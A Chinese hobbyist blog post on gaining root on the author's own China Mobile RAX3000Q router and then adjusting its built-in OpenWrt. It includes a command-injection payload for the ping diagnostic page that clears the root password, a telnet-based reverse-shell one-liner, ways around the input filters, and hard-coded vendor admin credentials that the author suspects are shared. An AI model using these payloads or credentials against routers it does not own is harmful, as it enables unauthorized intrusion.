---
title: "中移RAX3000Q路由器解锁telnet/ssh及使用内置的OpenWrt"
date: 2022-01-29T21:01:56+08:00
categories:
  - Router
tags:
  - 路由器
  - OpenWrt
draft: false
---

> 注意：作者撰写本文时，基于软件版本V1.0.0、硬件版本TZ7.823.346A的中国移动RAX3000Q路由器，随着版本更新其中的方法可能失效。

# TL;DR

对于不想阅读探索过程的读者，可以通过以下两个步骤快速开启telnet

- 删除root密码：

  - 在web面板「诊断 - ping」页面的ip地址输入框填入以下内容后点击开始：

    ```
    $(passwd${IFS}-d${IFS}root)
    ```

    此时root用户的密码已经清除。可以在`http://<路由器ip>:8080/`处的LuCI直接以root身份无密码登陆

- 开启telnet/ssh：只介绍稳定telnet的开启方法，自带的ssh服务有点麻烦暂时不管自己折腾（都有luCI了，方法肯定多的去了）。

  - 回到web面板，以帐号`superadmin`，密码`83583000`登陆，在「管理 - 系统设置」页面可开启telnet。
  - 注意开启的**telnet监听端口为4719**，使用`telnet 192.168.10.1 4719`连接，root账户登陆，无需密码

# 起源


家里的新3路由器已服役2年，一直停留在WiFi5，但手机和电脑却已经是WiFi6甚至WiFi6E，且隔一堵墙后的网络已经无法跑满我的300M家宽，遂萌生了换路由器的想法。

这次更换的是中国移动的RAX3000Q，采用[IPQ5018](https://www.qualcomm.com/products/immersive-home-216-platform)，支持160MHz的WiFi6，与红米AX3000几乎相同的硬件配置（见：[恩山无线-120多款wifi6机型详细配置](https://www.right.com.cn/forum/thread-4017133-1-1.html)），但是价格相对实惠且能组mesh（虽然我家也确实没组mesh的需求，但anyway，就当是增援未来了hhh）。我是在「电脑吧测评室」看到的~~这件垃圾~~这台路由器，与之一同推荐的还有H3C的RC3000/RT3000，后者在acwifi的站长测评后价格疯涨到了220元（~~都涨到220元了还能叫捡垃圾吗？？~~），而我选择的RAX3000Q具有和它非常相似的配置，但是价格更低，淘宝150拿下了（本来130的，js涨价啦）。

# 探索

这台路由器的web面板相对简单，操作简洁，我很快就将其配置成了AP，与原先的新3路由桥接后，家里的无线网升级成了WiFi6。但怎么能止步于此呢？

## 简单的尝试

接着尝试使用nmap扫描端口，发现8080端口上竟赫然跑着一个LuCI：

```
PORT     STATE SERVICE    VERSION
53/tcp   open  domain     Cloudflare public DNS
80/tcp   open  http       mini_httpd 1.30 26Oct2018
|_http-title: \xE4\xB8\xAD\xE5\x9B\xBD\xE7\xA7\xBB\xE5\x8A\xA8
|_http-server-header: mini_httpd/1.30 26Oct2018
2601/tcp open  tcpwrapped
8080/tcp open  http       LuCI Lua http config
|_http-title: Site doesn't have a title (text/html).
```

![左为luci，右为中国移动的web面板](/images/image-20220129213453049.png)

进一步判断发现这路由器中确实包含一个OpenWrt实例，且从版本号分析应该是QSDK而非官方的OpenWrt。也就是说这台路由器其实是基于QSDK开发而成的。

接着我开始尝试取得这台路由器的完全控制，具体来说，获得一个root的shell（通过ssh或者telnet），让它足够用来替换旧的新3路由器。

在接下来的两天里，我尝试过爆破LuCI的root用户密码（别看OpenWrt版本很旧，但是LuCI却是最新版），分析80端口上的面板存在的逻辑漏洞，甚至是分析[mini_httpd](https://acme.com/software/mini_httpd/)（这东西的最新版1.30虽然是2018年释出，但似乎一直没有人发现新的漏洞）。在与群友讨论无果后，我暂时的放弃了。

## 拿到shell

一个星期后的下午，摸鱼中的我再次无聊地点击着web面板，在「诊断 - ping」页面时注意到那个输入ping的目标ip的输入框，抱着试试的心态，发现了这里存在的一个shell语句注入。

![image-20220129215720075](/images/image-20220129215720075.png)

接着，我尝试创建一个反弹shell连接到我的笔记本（192.168.123.197）上的1031端口（感谢MiaoTony佬推荐的[反弹shell生成工具](https://www.revshells.com/)）。

```shell
$(TF=$(mktemp -u);mkfifo $TF && telnet 192.168.123.197 1031 0<$TF | ash 1>$TF)
```

这里有几个要点：

- 路由器中使用的是busybox，没有bash但有ash，没有nc和python，但可以用telnet

- 后端似乎过滤了`"`和`` `，但是没有过滤`$()`

- 这个输入框里不允许出现空白字符，但只是前端过滤，绕过方法：

  - F12改前端代码（x
  - 使用`${IFS}`替代所有空格，但是要注意输入框字符长度限制
  - 直接F12改或者在BurpSuite里修改请求里的`url`参数绕过
  
  ![image-20220129234054687](/images/image-20220129234054687.png)

## 持久化

拿到反弹shell后，我们第一步可以直接使用passwd命令修改root密码，然后我们就能从8080端口的LuCI上登陆了：

![image-20220129221356976](/images/image-20220129221356976.png)

OpenWrt中默认使用dropbear作为ssh服务器，但是因为未知的原因无法通过`/etc/init.d/dropbear start`启动。因此我选择在反弹shell中启动一个监听22端口的临时dropbear服务，然后从笔记本上ssh连上去

```sh
/usr/sbin/dropbear -p 22
```

![image-20220130002802328](/images/image-20220130002802328.png)

（草，为什么是armv7l，说好的Dual-core Cortex-A53，怎么就配了个32位OpenWrt？？？

## 继续探索

### 隐藏的账户

使用`mdlcfg -e `可以导出一些系统系统配置信息，其中还发现了一些有价值的东西：

```sh
export SYS_SUPER_LOGIN_NAME="superadmin"
export SYS_SUPER_LOGIN_PWD="83583000"
export SYS_SENIOR_LOGIN_NAME="senior"
export SYS_SENIOR_LOGIN_PWD="123456"
export SYS_USER_LOGIN_NAME="user"
export SYS_USER_LOGIN_PWD="******"
```

看起来web面板包括三个帐号，权限从低到高依次为`user`、`senior`、`superadmin`

- user：最普通的账户，密码在机器背面
- senior：猜测应该是高级用户，弱密码`123456`，增加了：
  - 对ANDLINK模块的控制（似乎是中国移动的一个模块）
  - 允许导出系统配置文件（文件被特别编码过，暂不知格式）
  - 远程抓包开关。开启后可以指定开启一个端口，使用wiresharp从该端口抓包
- superadmin：最顶级的用户，密码似乎都是`83583000`（个人猜测在中国移动的路由器中是通用的，搜索引擎搜一下这个密码有惊喜），增加了：
  - 可以修改web面板主题配色
  - 显示git分支名和git commit号（我这里看到的值为空）
  - TR069功能开关和配置
  - 和苗FOTA功能开关（疑似是和固件升级有关的，我给关上了）
  - 无线网络可选WiFi国家码，可设置3个访客网络
  - 静态路由（不知道是啥）
  - URL过滤、ACL过滤
  - **telnet开关（可用，监听在4719端口）、ssh开关（但好像是坏的）**、锁网开关、允许导入配置
  - 指定WAN口
  - 本地对指定interface抓包并保存到文件

### 更换软件源(不推荐)

> 注意：不建议直接在QSDK固件上直接更新使用openwrt官方的仓库，[下一篇文章](https://blog.imlk.top/posts/rax3000q-compile-qsdk/)介绍了怎么从QSDK源码编译能够兼容的软件包ipk文件

IPQ5018是双核Cortex-A53处理器，opkg默认的架构为`ipq`，但是OpenWrt软件源里并没有这种架构，我们需要选择一个相近的架构。

由于目前运行的QSDK是32位的，无法像[这篇文章](https://xn--m80a.ml/openwrt/dev/10.html)一样直接使用`aarch64_cortex-a53`的软件源。根据cpuinfo信息判断应该是armv7l且支持vfpv4硬件浮点，但是内置的interpreter却是`/lib/ld-musl-arm.so.1`，只支持软件浮点，这个问题可以创建一个软链接来解决。

```sh
ln -s /lib/ld-musl-arm.so.1 /lib/ld-musl-armhf.so.1
```

最终我选择的架构是`arm_cortex-a7_neon-vfpv4`。在`/etc/opkg.conf`中添加以下内容：

```
arch all 1
arch noarch 1
arch ipq 10
arch arm_cortex-a7_neon-vfpv4 20
```

另一个问题是musl-libc的版本问题，内置的musl-libc版本为1.1.16且没法更新，考虑到兼容性问题（比如动态链接时找不到某些符号），选择了OpenWrt18.06版本（musl-libc版本为1.1.19）的软件源，如果还是遇问题可尝试降为OpenWrt17.01（musl-libc版本为1.1.16）。

```
src/gz openwrt_base http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/base
src/gz openwrt_luci http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/luci
src/gz openwrt_packages http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/packages
src/gz openwrt_routing http://downloads.openwrt.org/releases/packages-18.06/arm_cortex-a7_neon-vfpv4/routing
```

**注意QSDK基于OpenWrt15.05，可能导致一些问题，因此请谨慎更新系统自带的软件包！！！！**

也请不要使用最新snapshots版本的软件源，因为自带的musl-libc版本较低，而[musl-libc中的一项改动](https://musl.libc.org/time64.html)引入了不兼容的问题，导致安装的程序无法运行。

#### opkg覆盖或删除系统软件包后恢复

openwrt的根目录`/`一般挂载为overlayfs，其中`/rom`作为lowerdir，这部分不可修改。`/overlay/upper`作为upperdir，存放的是用户对根文件系统的改动内容。恢复出厂时实际上会清空`/overlay/upper`。

当我们不小心删除或覆盖了自带的软件包，不需要恢复出厂设置，我们可以通过编辑`/overlay/upper`中的内容来回退。

以`odhcpd`这个包为例，假设我们想恢复自带的`odhcpd`包，或者回退版本：

- 首先把新安装的版本给`opkg remove`卸载掉，然后我们「恢复」自带的版本。

- 第二步从`/rom`里找出这个包所包含的文件列表，对于`odhcpd`这个包，在`/rom/usr/lib/opkg/info/odhcpd.list`中

  ```
  root@imlk-rax3000q:~# cat /rom/usr/lib/opkg/info/odhcpd.list
  /usr/sbin/odhcpd
  /etc/init.d/odhcpd
  /etc/uci-defaults/odhcpd.defaults
  /usr/sbin/odhcpd-update
  ```

- 接着在`/overlay/upper`里面将文件列表里的文件逐个删除（你会发现这些文件在`/overlay/upper`里面都表现成字符设备）。

- 删除`/overlay/upper/usr/lib/opkg/info/`里面的`odhcpd.control`和`odhcpd.list`，以及`odhcpd.preinst`、`odhcpd.postinst`、`odhcpd.prerm`、`odhcpd.postrm`等总之就是`odhcpd`作为文件名然后各种不同后缀的文件

- 到这一步文件已经恢复完成，接着需要修改opkg的数据库。具体来说，去`/rom/usr/lib/opkg/info/opkg.list`里面复制你要恢复软件包对应的项目，将其添加到`/usr/lib/opkg/info/opkg.list`中。

- 编辑完overlayfs后，切记要进行一个remount

  ```sh
  mount -oremount /
  ```

  此时`opkg`应该已经认出了我们恢复的软件包

  ```
  root@imlk-rax3000q:~# opkg list-installed | grep odhcpd
  odhcpd - 2016-10-09-801cfeea100ca7b211c9841f0fcb757b17f47860
  ```

### 该路由器的其它信息

#### uname -a

```
Linux OpenWrt 4.4.60 #1 SMP Thu Oct 21 02:26:15 CST 2021 armv7l GNU/Linux
```

#### libc.so

```
musl libc (arm)
Version 1.1.16
Dynamic Program Loader
Usage: /lib/libc.so [options] [--] pathname [args]
```

#### /etc/openwrt_release

```
DISTRIB_ID='OpenWrt'
DISTRIB_RELEASE='Chaos Calmer'
DISTRIB_REVISION='079f770+r49254'
DISTRIB_CODENAME='chaos_calmer'
DISTRIB_TARGET='ipq/ipq50xx'
DISTRIB_DESCRIPTION='OpenWrt Chaos Calmer 15.05.1'
DISTRIB_TAINTS='no-all busybox override'
```

#### /etc/openwrt_version

```
15.05.1
```

#### cpuinfo

```
processor       : 0
model name      : ARMv7 Processor rev 4 (v7l)
BogoMIPS        : 48.00
Features        : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm aes pmull sha1 sha2 crc32 
CPU implementer : 0x51
CPU architecture: 7
CPU variant     : 0xa
CPU part        : 0x801
CPU revision    : 4

processor       : 1
model name      : ARMv7 Processor rev 4 (v7l)
BogoMIPS        : 48.00
Features        : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm aes pmull sha1 sha2 crc32 
CPU implementer : 0x51
CPU architecture: 7
CPU variant     : 0xa
CPU part        : 0x801
CPU revision    : 4

Hardware        : Generic DT based system
Revision        : 0000
Serial          : 0000000000000000
```

#### mtd分区信息

```
dev:    size   erasesize  name
mtd0: 00080000 00020000 "0:SBL1"
mtd1: 00080000 00020000 "0:MIBIB"
mtd2: 00040000 00020000 "0:BOOTCONFIG"
mtd3: 00040000 00020000 "0:BOOTCONFIG1"
mtd4: 00100000 00020000 "0:QSEE_1"
mtd5: 00100000 00020000 "0:QSEE"
mtd6: 00040000 00020000 "0:DEVCFG_1"
mtd7: 00040000 00020000 "0:DEVCFG"
mtd8: 00040000 00020000 "0:CDT"
mtd9: 00040000 00020000 "0:CDT_1"
mtd10: 00080000 00020000 "0:APPSBLENV"
mtd11: 00140000 00020000 "0:APPSBL"
mtd12: 00140000 00020000 "0:APPSBL_1"
mtd13: 00100000 00020000 "0:ART"
mtd14: 00080000 00020000 "0:TRAINING"
mtd15: 03000000 00020000 "rootfs_1"
mtd16: 03000000 00020000 "rootfs"
mtd17: 00a40000 00020000 "TZPARAM"
mtd18: 00a40000 00020000 "TZBAK"
mtd19: 002fce60 0001f000 "kernel"
mtd20: 00367000 0001f000 "wifi_fw"
mtd21: 00004000 0001f000 "bt_fw"
mtd22: 01303000 0001f000 "ubi_rootfs"
mtd23: 00c1c000 0001f000 "rootfs_data"
mtd24: 00706000 0001f000 "tzparam"
```

# 结语

在这次摸索过程中，体会到了BurpSuite这个工具的强大（内置浏览器真的太舒服辣），虽然最后还是走运才成功把root密码给改掉hhh。

将ANDLINK、FOTA、TR069服务关闭后，接下来我准备用这台路由器替换老的新3路由，但遗憾的是OpenWrt官方还未对IPQ50xx适配，可能还是要等QSDK释出ipq50XX的源码（但貌似[QSDK的代码树](https://source.codeaurora.org/quic/cc-qrdk/oss/system/openwrt/log/?h=NHSS.QSDK.12.0.r9&qt=grep&q=ipq50xx)中已经有了？）才可能有机会舒服地用上OpenWrt。







